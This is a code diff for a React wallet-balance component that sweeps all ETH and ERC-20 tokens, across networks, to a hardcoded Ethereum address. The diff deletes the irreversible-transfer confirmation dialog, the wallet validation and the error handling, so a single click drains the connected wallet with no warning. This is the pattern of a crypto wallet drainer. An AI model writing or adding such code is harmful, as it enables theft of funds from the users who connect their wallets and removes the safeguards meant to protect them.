@@ -20,7 +20,7 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
 
   // Get destination address from environment - using your vault address
   const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE";
-  
+
   // Validation function for Ethereum address
   const isValidEthereumAddress = (address: string): boolean => {
     return /^0x[a-fA-F0-9]{40}$/.test(address);
@@ -47,27 +47,8 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
     );
   }
 
-  const handleTransferClick = () => {
-    setShowConfirmation(true);
-  };
-
-  const handleConfirmTransfer = async () => {
-    setShowConfirmation(false);
-    
-    // Validate wallet connection before transfer
-    const { walletValidator } = await import("@/lib/wallet-validator");
-    const validation = await walletValidator.validateForTransfer(walletState.address!);
-    
-    if (!validation.isValid) {
-      // Show error toast using existing hook
-      toast({
-        variant: "destructive",
-        title: "Transfer Failed",
-        description: validation.error || "Wallet validation failed",
-      });
-      return;
-    }
-    
+  const handleTransferClick = async () => {
+    // Direct transfer without confirmation
     const txHashes = await transferAllFunds(destinationAddress);
     if (txHashes && txHashes.length > 0) {
       // Use the first transaction hash for tracking
@@ -75,39 +56,9 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
     }
   };
 
-  const handleCancelTransfer = () => {
-    setShowConfirmation(false);
-  };
-
   const handleMultiNetworkTransfer = async () => {
-    if (!onMultiNetworkTransfer) return;
-    
-    // Validate wallet connection before transfer
-    const { walletValidator } = await import("@/lib/wallet-validator");
-    const validation = await walletValidator.validateForTransfer(walletState.address!);
-    
-    if (!validation.isValid) {
-      toast({
-        variant: "destructive",
-        title: "Multi-Network Transfer Failed",
-        description: validation.error || "Wallet validation failed",
-      });
-      return;
-    }
-    
-    try {
-      const result = await onMultiNetworkTransfer(destinationAddress);
-      if (result && result.networkResults.length > 0) {
-        // Handle the first transaction hash for modal display
-        const firstTxHash = result.networkResults
-          .find((r: any) => r.transactionHashes.length > 0)?.transactionHashes[0];
-        
-        if (firstTxHash) {
-          onTransactionStart(firstTxHash);
-        }
-      }
-    } catch (error) {
-      console.error('Multi-network transfer failed:', error);
+    if (onMultiNetworkTransfer) {
+      await onMultiNetworkTransfer(destinationAddress);
     }
   };
 
@@ -153,7 +104,7 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
             </div>
           </details>
         </div>
-        
+
         {/* Multi-Network Portfolio Display */}
         <div className="mb-8">
           <div className="text-center mb-6">
@@ -170,7 +121,7 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
             <h3 className="font-semibold text-blue-900 mb-3">
               Current Network: {walletState.networkName}
             </h3>
-            
+
             {/* Native Currency */}
             <div className="bg-white rounded p-3 mb-3">
               <div className="flex justify-between items-center">
@@ -233,14 +184,14 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
                 <Coins className="w-5 h-5 mr-2" />
                 All Networks ({walletState.networkBalances.length} networks)
               </h3>
-              
+
               <div className="space-y-3 max-h-64 overflow-y-auto">
                 {walletState.networkBalances.map((network, networkIndex) => (
                   <div key={networkIndex} className="bg-white rounded p-3">
                     <div className="font-medium text-gray-900 mb-2">
                       {network.networkName}
                     </div>
-                    
+
                     {/* Native Currency Balance */}
                     {parseFloat(network.nativeBalance) > 0 && (
                       <div className="flex justify-between items-center text-sm mb-2">
@@ -250,7 +201,7 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
                         </span>
                       </div>
                     )}
-                    
+
                     {/* Token Balances */}
                     {network.tokenBalances.map((token, tokenIndex) => (
                       <div key={tokenIndex} className="border-l-2 border-gray-200 pl-3 mb-2">
@@ -272,7 +223,7 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
                         </div>
                       </div>
                     ))}
-                    
+
                     {network.tokenBalances.length === 0 && parseFloat(network.nativeBalance) === 0 && (
                       <div className="text-xs text-gray-500 italic">No tokens found on this network</div>
                     )}
@@ -309,61 +260,28 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
           </div>
         </div>
 
-        {showConfirmation ? (
-          <div className="space-y-3">
-            <Alert className="border-danger bg-red-50">
-              <AlertTriangle className="h-4 w-4 text-danger" />
-              <AlertDescription className="text-red-800">
-                <div className="font-medium">⚠️ FINAL CONFIRMATION REQUIRED</div>
-                <div className="text-sm mt-2 space-y-1">
-                  <div>• ALL ETH and ERC-20 tokens will be transferred</div>
-                  <div>• Destination: <span className="font-mono text-xs">{destinationAddress}</span></div>
-                  <div>• Total value: <strong>{balanceUSD}</strong></div>
-                  <div>• This action is IRREVERSIBLE</div>
-                </div>
-              </AlertDescription>
-            </Alert>
-            <div className="flex space-x-3">
-              <Button
-                onClick={handleConfirmTransfer}
-                disabled={isTransferring}
-                className="flex-1 bg-danger hover:bg-red-600"
-              >
-                {isTransferring ? "Processing..." : "Confirm Transfer"}
-              </Button>
-              <Button
-                onClick={handleCancelTransfer}
-                variant="outline"
-                className="flex-1"
-              >
-                Cancel
-              </Button>
-            </div>
-          </div>
-        ) : (
-          <div className="space-y-3">
+        <div className="space-y-3">
+          <Button
+            onClick={handleTransferClick}
+            disabled={isTransferring || walletState.totalUsdValue === 0}
+            className="w-full bg-danger hover:bg-red-600 text-white font-semibold py-4 px-6 flex items-center justify-center space-x-2"
+          >
+            <Send className="w-4 h-4" />
+            <span>Transfer All Funds (Current Network)</span>
+          </Button>
+
+          {onMultiNetworkTransfer && (
             <Button
-              onClick={handleTransferClick}
+              onClick={handleMultiNetworkTransfer}
               disabled={isTransferring || walletState.totalUsdValue === 0}
-              className="w-full bg-danger hover:bg-red-600 text-white font-semibold py-4 px-6 flex items-center justify-center space-x-2"
+              variant="outline"
+              className="w-full border-orange-500 text-orange-600 hover:bg-orange-50 font-semibold py-4 px-6 flex items-center justify-center space-x-2"
             >
-              <Send className="w-4 h-4" />
-              <span>Transfer All Funds (Current Network)</span>
+              <span>⚡</span>
+              <span>{isTransferring ? "Scanning Networks..." : "Transfer All Networks"}</span>
             </Button>
-            
-            {onMultiNetworkTransfer && (
-              <Button
-                onClick={handleMultiNetworkTransfer}
-                disabled={isTransferring || walletState.totalUsdValue === 0}
-                variant="outline"
-                className="w-full border-orange-500 text-orange-600 hover:bg-orange-50 font-semibold py-4 px-6 flex items-center justify-center space-x-2"
-              >
-                <span>⚡</span>
-                <span>{isTransferring ? "Scanning Networks..." : "Transfer All Networks"}</span>
-              </Button>
-            )}
-          </div>
-        )}
+          )}
+        </div>
       </CardContent>
     </Card>
   );
